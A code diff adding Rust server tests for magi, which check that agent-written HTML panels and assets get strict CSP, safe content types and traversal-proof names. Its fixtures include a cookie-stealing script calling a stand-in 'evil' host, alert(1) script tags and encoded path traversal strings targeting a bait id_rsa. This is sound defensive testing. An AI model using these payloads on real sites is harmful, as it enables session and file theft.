+            "land".to_owned(),
+            "fix".to_owned(),
+            "Merge this?".to_owned(),
+            "the diff is in the panel".to_owned(),
+            vec!["merge".to_owned(), "hold".to_owned()],
+        );
+        // Staged outside the questions root, because `put_panel` copies from
+        // wherever the agent left its files.
+        let staging = fx.home.path().join("staging");
+        std::fs::create_dir_all(&staging).expect("staging dir");
+        let sources: Vec<PathBuf> = assets
+            .iter()
+            .map(|(name, bytes)| {
+                let path = staging.join(name);
+                std::fs::write(&path, bytes).expect("write staged asset");
+                path
+            })
+            .collect();
+        store
+            .put_panel(&mut q, html, &sources)
+            .expect("write the panel");
+        store.put(&mut q).expect("put question");
+        q.id
+    }
+
+    /// An interview on disk, without talking to a model.
+    ///
+    /// Written as JSON straight into the store the server reads, because the
+    /// only constructor `chat` offers spawns an agent CLI. The one thing this
+    /// cannot make up is the seat, so it is built with the real
+    /// `SeatState::new` and serialized - the alternative, hand-writing that
+    /// object, would make these tests fail the day the seat gains a field.
+    fn interview(fx: &Fixture, id: &str, status: &str, draft: Option<&str>) -> String {
+        let store = fx.chats();
+        std::fs::create_dir_all(store.root()).expect("chats dir");
+        let seat = serde_json::to_value(crate::agent::SeatState::new("plan", "sonnet", 7))
+            .expect("serialize a seat");
+        let body = serde_json::json!({
+            "schema": 1,
+            "id": id,
+            "repo": "/repo/magi",
+            "agent": "sonnet",
+            "status": status,
+            "turns": [
+                { "who": "operator", "body": "rework the config loader",
+                  "at": Timestamp::now().to_string() },
+                { "who": "agent", "body": "Which part is hurting?",
+                  "at": Timestamp::now().to_string() },
+            ],
+            "draft": draft,
+            "task": Value::Null,
+            "created_at": Timestamp::now().to_string(),
+            "updated_at": Timestamp::now().to_string(),
+            "seat": seat,
+        });
+        std::fs::write(store.path_of(id), body.to_string()).expect("write the chat");
+        // A chat the server cannot parse would make every assertion below a
+        // 500 that says nothing about the route under test.
+        store.get(id).expect("the seeded chat has to be readable");
+        id.to_owned()
+    }
+
+    /// A task file that satisfies `plan::review_draft`, so `POST /file` has
+    /// something to accept.
+    fn good_draft() -> String {
+        "# Rework the config loader\n\n\
+         ## Why\n\n\
+         It re-reads `magi.toml` on every lookup, so a run that asks for the \
+         roster four hundred times pays four hundred parses of the same file.\n\n\
+         ## What\n\n\
+         Load the layers once when the run starts and hand the merged value \
+         around. Nothing about the file format changes.\n\n\
+         ## Acceptance criteria\n\n\
+         - `Config::discover` is called exactly once per run.\n\
+         - `cargo test` passes with no change to any existing assertion.\n"
+            .to_owned()
+    }
+
+    #[tokio::test]
+    async fn both_panel_routes_send_the_whole_policy_that_makes_agent_html_safe() {
+        let fx = Fixture::start().await;
+        let id = panel(
+            &fx,
+            "<h1>Merge?</h1><img src=\"diff.svg\">",
+            &[("diff.svg", b"<svg xmlns='http://www.w3.org/2000/svg'/>")],
+        );
+
+        for path in [
+            format!("/api/questions/{id}/panel"),
+            format!("/api/questions/{id}/asset/diff.svg"),
+        ] {
+            let res = fx.get(&path).await;
+            assert_eq!(res.status, 200, "{path}: {}", res.body);
+            // The whole string, not a substring. A weakened directive - an
+            // `img-src *` that lets a panel beacon out to a remote host, a
+            // `script-src` anything, a missing `form-action` that lets it post
+            // the owner's decision to a third party - has to fail here, and a
+            // `contains` assertion would let every one of those through.
+            assert_eq!(
+                res.header("content-security-policy"),
+                Some(
+                    "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; \
+                     font-src data:; base-uri 'none'; form-action 'none'; \
+                     frame-ancestors 'self'"
+                ),
+                "{path} is the only thing between a hostile panel and the tailnet"
+            );
+            assert_eq!(
+                res.header("x-content-type-options"),
+                Some("nosniff"),
+                "{path}: a browser must not re-decide the type we sent"
+            );
+            assert_eq!(
+                res.header("referrer-policy"),
+                Some("no-referrer"),
+                "{path}: a panel must not leak the question id off the machine"
+            );
+
+            // The front end mounts the frame only after a `HEAD` says the
+            // panel is there, so `HEAD` has to answer with the same status and
+            // the same policy as `GET` - a preflight that came back without
+            // the CSP would mean a frame mounted on an unverified promise.
+            let pre = fx.head(&path).await;
+            assert_eq!(pre.status, res.status, "{path}: HEAD must agree with GET");
+            assert_eq!(
+                pre.header("content-security-policy"),
+                res.header("content-security-policy"),
+                "{path}: the preflight carries the same policy"
+            );
+            assert_eq!(
+                pre.header("content-type"),
+                res.header("content-type"),
+                "{path}: the preflight carries the same type"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn a_panel_reaches_the_browser_byte_for_byte() {
+        let fx = Fixture::start().await;
+        // Markup a sanitiser would be tempted to touch: a stray `<`, a script
+        // tag, an entity, and a multi-byte character. The sandbox is what makes
+        // this safe, so nothing here may be rewritten on the way out - a
+        // rewritten diff is a diff the owner cannot trust.
+        let html = "<h1>Merge?</h1><p>a &lt; b — 変更</p><script>alert(1)</script>";
+        let id = panel(&fx, html, &[]);
+
+        let res = fx.get(&format!("/api/questions/{id}/panel")).await;
+
+        assert_eq!(res.status, 200);
+        assert_eq!(res.bytes, html.as_bytes(), "served verbatim, not sanitised");
+        assert_eq!(res.header("content-type"), Some("text/html; charset=utf-8"));
+        assert_eq!(
+            res.header("content-disposition"),
+            None,
+            "the panel itself is rendered in the frame, not downloaded"
+        );
+    }
+
+    #[tokio::test]
+    async fn an_svg_asset_is_a_download_and_a_png_is_not() {
+        let fx = Fixture::start().await;
+        let svg = b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>";
+        let png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR".as_slice();
+        let id = panel(
+            &fx,
+            "<img src=\"diff.svg\"><img src=\"shot.png\">",
+            &[("diff.svg", svg), ("shot.png", png)],
+        );
+
+        let as_svg = fx.get(&format!("/api/questions/{id}/asset/diff.svg")).await;
+        let as_png = fx.get(&format!("/api/questions/{id}/asset/shot.png")).await;
+
+        assert_eq!(as_svg.status, 200);
+        assert_eq!(as_svg.header("content-type"), Some("image/svg+xml"));
+        // An SVG is XML that may carry script. Inside the panel it is an
+        // `<img src>` and the script cannot run; opened at the top level it
+        // would be a document on magi's own origin, so the browser is told to
+        // download it instead of rendering it.
+        assert_eq!(as_svg.header("content-disposition"), Some("attachment"));
+
+        assert_eq!(as_png.status, 200);
+        assert_eq!(as_png.header("content-type"), Some("image/png"));
+        assert_eq!(
+            as_png.header("content-disposition"),
+            None,
+            "a raster image has no execution surface, so tapping it still shows it"
+        );
+        assert_eq!(as_png.bytes, png, "a binary asset survives the round trip");
+    }
+
+    #[tokio::test]
+    async fn an_html_asset_is_never_served_as_html() {
+        let fx = Fixture::start().await;
+        let id = panel(
+            &fx,
+            "<p>see the notes</p>",
+            &[
+                (
+                    "notes.html",
+                    b"<script>fetch('http://evil/'+document.cookie)</script>",
+                ),
+                ("hook.js", b"fetch('http://evil/')"),
+                ("data.json", b"{}"),
+                ("HEADLINE.TXT", b"plain"),
+            ],
+        );
+
+        for name in ["notes.html", "hook.js", "data.json"] {
+            let res = fx.get(&format!("/api/questions/{id}/asset/{name}")).await;
+            assert_eq!(res.status, 200, "{name}: {}", res.body);
+            // Serving this as text/html would be a way to reach agent markup
+            // at the top level of the operator's browser, outside the frame's
+            // sandbox and outside its CSP - which is the whole thing the panel
+            // design exists to prevent. Unlisted types are downloads.
+            assert_eq!(
+                res.header("content-type"),
+                Some("application/octet-stream"),
+                "{name} must not be a type the browser will execute or render"
+            );
+        }
+        // The whitelist is matched case-insensitively, so an agent shouting the
+        // extension still gets a readable file rather than a download.
+        let txt = fx
+            .get(&format!("/api/questions/{id}/asset/HEADLINE.TXT"))
+            .await;
+        assert_eq!(
+            txt.header("content-type"),
+            Some("text/plain; charset=utf-8")
+        );
+    }
+
+    #[tokio::test]
+    async fn no_spelling_of_a_traversing_asset_name_reaches_the_filesystem() {
+        let fx = Fixture::start().await;
+        let id = panel(&fx, "<p>x</p>", &[("diff.svg", b"<svg/>")]);
+        // Something outside the panel directory that a traversal would reach if
+        // one got through, so a passing test is not merely "the file was
+        // missing anyway".
+        std::fs::write(fx.questions().root().join("id_rsa"), b"secret").expect("write the bait");
+
+        // Decoded before this server's handler sees them: axum percent-decodes
+        // path parameters, so `name` arrives as `../id_rsa`, `..\id_rsa` and a
+        // string with a NUL in it. All three look like ordinary single-segment
+        // filenames to the router, so the router passes them through and
+        // `valid_asset_name` is what refuses them - for the literal `..`, and
+        // for `/`, `\` and NUL not being in the permitted character set.
+        for encoded in [
+            "%2e%2e%2fid_rsa",
+            "..%2fid_rsa",
+            "..%5cid_rsa",
+            "%2e%2e%5cid_rsa",
+            "diff%00.svg",
+            "..",
+            ".hidden",
+            "%2e%2e%2f%2e%2e%2fid_rsa",
+        ] {
+            let res = fx
+                .get(&format!("/api/questions/{id}/asset/{encoded}"))
+                .await;
+            assert_eq!(
+                res.status, 400,
+                "`{encoded}` has to be refused by name, not looked up: {}",
+                res.body
+            );
+            assert!(res.json()["error"].is_string(), "{}", res.body);
+        }
+
+        // Not decoded, and never this handler's problem: a real slash makes the
+        // request one segment too long for `/api/questions/{id}/asset/{name}`,
+        // so axum's router has no route to match and answers before any code
+        // here runs. Asserted so that a future route with a wildcard segment
+        // cannot quietly open this door.
+        for literal in ["../id_rsa", "../../questions/id_rsa", "..%5c../id_rsa"] {
+            let res = fx
+                .get(&format!("/api/questions/{id}/asset/{literal}"))
+                .await;
+            assert_eq!(
+                res.status, 404,
+                "`{literal}` must not match the asset route at all: {}",
+                res.body
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn a_missing_panel_and_an_unknown_asset_are_both_json_404s() {
+        let fx = Fixture::start().await;
+        let plain = ask(&fx, "Which backend?", &["SQLite"]);
+        let with_panel = panel(&fx, "<p>x</p>", &[("diff.svg", b"<svg/>")]);
+
+        // A question nobody wrote a panel for. The client preflights with HEAD
+        // and cannot see inside a sandboxed frame, so this must be a status and
+        // not an empty page.
+        let none = fx.get(&format!("/api/questions/{plain}/panel")).await;
+        assert_eq!(none.status, 404, "{}", none.body);
+        assert!(none.json()["error"].is_string(), "{}", none.body);
+        assert_eq!(
+            fx.head(&format!("/api/questions/{plain}/panel"))
+                .await
+                .status,
+            404,
+            "the preflight is the only way the client can learn this"
+        );
+
+        // A name that is perfectly legal and simply is not there.
+        let missing = fx
+            .get(&format!("/api/questions/{with_panel}/asset/absent.png"))
+            .await;
+        assert_eq!(missing.status, 404, "{}", missing.body);
+        assert!(missing.json()["error"].is_string(), "{}", missing.body);
+
+        // A question that does not exist at all, on both routes.
+        assert_eq!(fx.get("/api/questions/nope/panel").await.status, 404);
+        assert_eq!(
+            fx.get("/api/questions/nope/asset/diff.svg").await.status,
+            404
+        );
+    }
+
+    #[tokio::test]
+    async fn the_chat_list_is_open_first_and_carries_the_whole_transcript() {
+        let fx = Fixture::start().await;
+        assert_eq!(fx.get("/api/health").await.json()["chats_open"], 0);
+
+        interview(&fx, "20260903-014455-old1", "filed", Some(&good_draft()));
+        interview(&fx, "20260903-014456-open", "open", None);
+
+        let listed = fx.get("/api/chats").await;
+        assert_eq!(listed.status, 200, "{}", listed.body);
+        let chats = listed.json();
+        assert_eq!(chats.as_array().map(Vec::len), Some(2));
+        assert_eq!(
+            chats[0]["id"], "20260903-014456-open",
+            "an unfinished interview is what the operator came back for: {chats}"
+        );
+        assert_eq!(chats[0]["status"], "open");
+        // The transcript is the only thing a chat is made of, so the list
+        // carries it rather than making the phone fetch each one.
+        assert_eq!(chats[0]["turns"][0]["who"], "operator");
+        assert_eq!(chats[0]["turns"][1]["body"], "Which part is hurting?");
+        assert_eq!(chats[1]["status"], "filed");
+
+        // The one number that says "you left an interview open"; a filed one
+        // has become a task and must not keep counting.
+        assert_eq!(fx.get("/api/health").await.json()["chats_open"], 1);
+    }
+
+    #[tokio::test]
+    async fn one_interview_is_readable_by_short_id_and_an_unknown_one_is_a_404() {
+        let fx = Fixture::start().await;
+        let id = interview(&fx, "20260903-014455-ab12", "open", None);
+
+        let full = fx.get(&format!("/api/chats/{id}")).await;
+        assert_eq!(full.status, 200, "{}", full.body);
+        assert_eq!(full.json()["id"], id);
+        assert_eq!(full.json()["repo"], "/repo/magi");
+
+        // The short id is what the operator reads off a notification.
+        let short = fx.get("/api/chats/ab12").await;
+        assert_eq!(short.status, 200, "{}", short.body);
+        assert_eq!(short.json()["id"], id);
+
+        let missing = fx.get("/api/chats/nosuchchat").await;
+        assert_eq!(missing.status, 404, "{}", missing.body);
+        assert!(
+            missing.json()["error"]
+                .as_str()
+                .is_some_and(|e| e.contains("chat")),
+            "the error names what was not found: {}",
+            missing.body
+        );
+    }
+
+    #[tokio::test]
+    async fn filing_a_bad_draft_reports_every_problem_at_once() {
+        let fx = Fixture::start().await;
+        let id = interview(&fx, "20260903-014455-ab12", "open", Some("do the thing"));
+
+        let res = fx.post(&format!("/api/chats/{id}/file"), None).await;
+
+        assert_eq!(res.status, 400, "{}", res.body);
+        let problems = res.json()["problems"].clone();
+        let problems = problems.as_array().expect("an array of problems");
+        // Every problem, not the first one. The operator is on a phone: a
+        // draft with no title and no acceptance criteria is one edit, and
+        // reporting it one problem per round trip means asking the interviewer
+        // to rewrite it twice.
+        assert!(
+            problems.len() > 1,
+            "one round trip has to be enough to fix the draft: {}",
+            res.body
+        );
+        assert!(problems.iter().all(|p| p.is_string()), "{}", res.body);
+        assert!(res.json()["error"].is_string(), "{}", res.body);
+        assert!(
+            fx.queue().list().is_empty(),
+            "a refused draft must not reach the queue"
+        );
+
+        // An interview the agent has not drafted for at all is the same shape,
+        // so the front end has one path rather than two.
+        let empty = interview(&fx, "20260903-014456-cd34", "open", None);
+        let res = fx.post(&format!("/api/chats/{empty}/file"), None).await;
+        assert_eq!(res.status, 400, "{}", res.body);
+        assert_eq!(
+            res.json()["problems"].as_array().map(Vec::len),
+            Some(1),
+            "{}",
+            res.body
+        );
+    }
+
+    #[tokio::test]
+    async fn filing_a_good_draft_queues_it_and_answers_with_the_task_id() {
+        let fx = Fixture::start().await;
+        let draft = good_draft();
+        let id = interview(&fx, "20260903-014455-ab12", "open", Some(&draft));
+
+        let res = fx.post(&format!("/api/chats/{id}/file"), None).await;
+
+        assert_eq!(res.status, 200, "{}", res.body);
+        let task = res.json()["task"]
+            .as_str()
+            .unwrap_or_else(|| panic!("a task id: {}", res.body))
+            .to_owned();
+
+        // The point of the whole browser interview: a real task in the real
+        // queue, indistinguishable from one filed at a terminal.
+        let queued = fx.queue().get(&task).expect("the task is on disk");
+        assert_eq!(
+            queued.instruction, draft,
+            "the draft reaches the graph verbatim"
+        );
+        assert_eq!(queued.repo, PathBuf::from("/repo/magi"));
+        assert_eq!(
+            fx.get("/api/queue").await.json()[0]["id"],
+            task,
+            "the filed task is the listed one"
+        );
+
+        // The interview is finished, so it stops asking to be finished.
+        let after = fx.get(&format!("/api/chats/{id}")).await.json();
+        assert_eq!(after["task"], task);
+        assert_eq!(after["status"], "filed");
+        assert_eq!(fx.get("/api/health").await.json()["chats_open"], 0);
+    }
+
+    #[tokio::test]
+    async fn a_second_turn_on_a_busy_chat_is_refused_rather_than_interleaved() {
+        let fx = Fixture::start().await;
+        let id = interview(&fx, "20260903-014455-ab12", "open", None);
+        let ui = Ui::new(
+            fx.queue(),
+            fx.questions(),
+            fx.chats(),
+            fx.runs(),
+            fx.home.path().to_path_buf(),
+            PathBuf::from("/repo/magi"),
+        );
+
+        // The claim a running `POST /say` holds. Taken directly rather than by
+        // starting a turn, because a turn spawns an agent CLI and no test here
+        // is allowed to do that.
+        let first = ui.begin_turn(&id).expect("the first turn claims the chat");
+        let second = ui.begin_turn(&id).expect_err("the second must be refused");
+        assert_eq!(
+            second.status,
+            StatusCode::CONFLICT,
+            "a double tap on a slow link must not append two half-turns"
+        );
+
+        // Dropped rather than released by hand, which is what makes a cancelled
+        // request - a phone that walked out of range mid-turn - leave the chat
+        // usable instead of wedged until the server restarts.
+        drop(first);
+        assert!(
+            ui.begin_turn(&id).is_ok(),
+            "the slot has to come back on its own"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_turn_with_nothing_in_it_never_reaches_an_agent() {
+        let fx = Fixture::start().await;
+        let id = interview(&fx, "20260903-014455-ab12", "open", None);
+
+        // Refused on the request, before the chat is even resolved, so an
+        // accidental send costs neither a model call nor a turn in the record.
+        for body in [r#"{"text":"   \n "}"#, r#"{}"#] {
+            let res = fx.post(&format!("/api/chats/{id}/say"), Some(body)).await;
+            assert_eq!(res.status, 400, "{body}: {}", res.body);
+        }
+        let res = fx.post("/api/chats", Some(r#"{"idea":"  "}"#)).await;
+        assert_eq!(res.status, 400, "{}", res.body);
+
+        assert_eq!(
+            fx.get(&format!("/api/chats/{id}")).await.json()["turns"]
+                .as_array()
+                .map(Vec::len),
+            Some(2),
+            "nothing above may have appended a turn"
+        );
     }
 
     #[tokio::test]
@@ -1636,9 +2763,29 @@ mod tests {
             .expect("a data line");
         let payload: Value = serde_json::from_str(data.trim()).expect("json payload");
         assert!(
-            payload["queue_rev"].is_u64() && payload["runs_rev"].is_u64(),
-            "the client needs both revisions to know what to refetch: {payload}"
+            payload["queue_rev"].is_u64()
+                && payload["runs_rev"].is_u64()
+                && payload["questions_rev"].is_u64()
+                && payload["chats_rev"].is_u64(),
+            "the client needs one revision per store to know what to refetch, \
+             and `chats_rev` is the only notification a slow interview gets - \
+             a phone whose radio slept through a turn learns about it here: \
+             {payload}"
         );
+
+        // The front end re-polls health on a timer and on wake, and takes the
+        // revisions from that answer whenever the stream is not up. So health
+        // has to carry every key the stream carries: a phone on a link that
+        // will not hold an SSE connection is exactly the phone that must still
+        // notice a question, and a missing key there is not a 500 but a UI
+        // that quietly stops updating.
+        let health = f.get("/api/health").await.json();
+        for key in ["queue_rev", "runs_rev", "questions_rev", "chats_rev"] {
+            assert!(
+                health[key].is_u64(),
+                "health is the change stream's fallback and is missing `{key}`: {health}"
+            );
+        }
     }
 
     #[test]
@@ -1717,5 +2864,42 @@ mod tests {
         assert_eq!(missing.status, StatusCode::NOT_FOUND);
         assert_eq!(ambiguous.status, StatusCode::BAD_REQUEST);
         assert_eq!(short, "20260902-140502-aabb");
+    }
+    #[tokio::test]
+    async fn a_panel_reaches_its_assets_by_the_bare_name_it_was_told_to_use() {
+        // The prompt tells agents to reference attachments by bare filename.
+        // A document served at `.../panel` resolves `shot.png` against its own
+        // directory, i.e. `.../shot.png`, which is not the asset route - so a
+        // panel written exactly as instructed showed broken images. Caught by
+        // looking at a real one in a browser, not by reading the code.
+        let fx = Fixture::start().await;
+        let id = panel(
+            &fx,
+            "<img src=\"shot.png\">",
+            &[("shot.png", b"\x89PNG\r\n\x1a\n")],
+        );
+
+        // The frame's own URL ends in a filename, so its siblings are reachable.
+        let doc = fx
+            .get(&format!("/api/questions/{id}/panel/index.html"))
+            .await;
+        assert_eq!(doc.status, 200, "{}", doc.body);
+        assert_eq!(doc.header("content-type"), Some("text/html; charset=utf-8"));
+
+        let sibling = fx.get(&format!("/api/questions/{id}/panel/shot.png")).await;
+        assert_eq!(sibling.status, 200, "{}", sibling.body);
+        assert_eq!(sibling.header("content-type"), Some("image/png"));
+        assert_eq!(
+            sibling.header("content-security-policy"),
+            Some(PANEL_CSP),
+            "the sibling route must carry the same policy as the asset route"
+        );
+
+        // The original spelling keeps working: HEAD on it is how the front end
+        // decides whether to mount a frame at all.
+        assert_eq!(
+            fx.head(&format!("/api/questions/{id}/panel")).await.status,
+            200
+        );
     }
 }
